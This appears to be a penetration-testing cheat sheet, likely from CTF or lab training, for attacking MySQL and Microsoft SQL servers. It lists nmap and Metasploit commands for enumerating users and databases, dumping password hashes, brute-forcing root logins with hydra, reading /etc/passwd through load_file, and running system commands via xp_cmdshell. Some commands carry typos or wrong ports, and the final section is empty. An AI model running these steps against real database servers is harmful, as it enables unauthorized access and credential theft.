---
description: 1433 - MS Sql, 3306 - Linux
---

# v - MySQL - 1433,3306

`nmap $ip -sV -p3306` - basic enumeration.

`mysql -h $ip -u root` - lets try to login with "root".

### Using Metasploit

```bash
# 1
use auxiliary/scanner/mysql/mysql_writable_dirs
show options
set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
setg rhosts $ip
show advanced
set verbose false
set username root
set password ""
options
run

# 2
# dumping hashed of users in the db
use auxiliary/scanner/mysql/mysql_hashdump
options
set username root
set password ""
exploit
```

## Accessing System FIles from MySql

```sql
# 1
# when you successfully login into victim mysql db
# outputs the /etc/passwd file.
select load_file('/etc/passwd');

```

## Using Nmap to check for Accounts with no passwords

`nmap $ip -sV -p3306 --script=mysql-empty-password` - finds accounts that require no password for authentication.

`nmap $ip -sV -p3306 --script=mysql-info` - outputs info about the db.

`nmap $ip -sV -p3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"` - enumerate users in the db.

`nmap $ip -sV -p3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"` - enumerate databases.

`nmap $ip -sV -p3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"` - enumerate variables.&#x20;

`nmap $ip -sV -p3306 --script=mysql-audit --script-args="mysql-audit.user='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"` - auditing the db.

`nmap $ip -sV -p3306 --script=mysql-dump-hashes --script-args="username='root',password=''"` - dumps hashes (hashdump).

## Dictionary Attacks (brutefrocing creds)

### \[msfconsole] Metasploit

```bash
# bruteforcing with metasploit
use auxilary/scanner/mysql/mysql_login
set rhosts $ip
set pass_file usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set verbose false
set stop_on_success true
set username root
run
```

### \[hydra] utility

`hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $ip mysql` - run the attack.



## Microsoft  SQL  nmap scripts

`nmap $ip -p1433 --script ms-sql-info` - enumerate the ms-sql server version.

`nmap $ip -p1433 --script ms-sql-ntlm-info --script-args  mssql.instance-port=1433`  - enumerate ms-sql ntlm info.

`nmap $ip -p3306 --script ms-sql-brute --script-args userdb=/path_to_wordlist,passdb=/path_to_wd` - brute forcing.

`nmap $ip -sV -p1433 --script=ms-sql-empty-password` - finds accounts that require no password for authentication.

`nmap $ip -sV -p3306 --script=ms-sql-query --script-args mssql.username=admin,mssql.password=dking,ms-sql-query.query="SELECT * FROM <table_name>..syslogins" -oN output.txt` - performs a query

`nmap $ip -sV -p3306 --script=ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anabell` - hashdump

`nmap $ip -sV -p3306 --script=ms-sql--xp-cmdshell --script-args mssql.username=admin,mssql.password=anabell,ms-sql-xp-cmdshell.cmd="ipconfig"` - run a query that executes the "ipconfig" cmd.

`nmap $ip -sV -p3306 --script=ms-sql--xp-cmdshell --script-args mssql.username=admin,mssql.password=anabell,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"` - run a query that reads the content of the "flag.txt" file.

## Microsoft  SQL enumeration with Metasploit

```bash
# 1

```











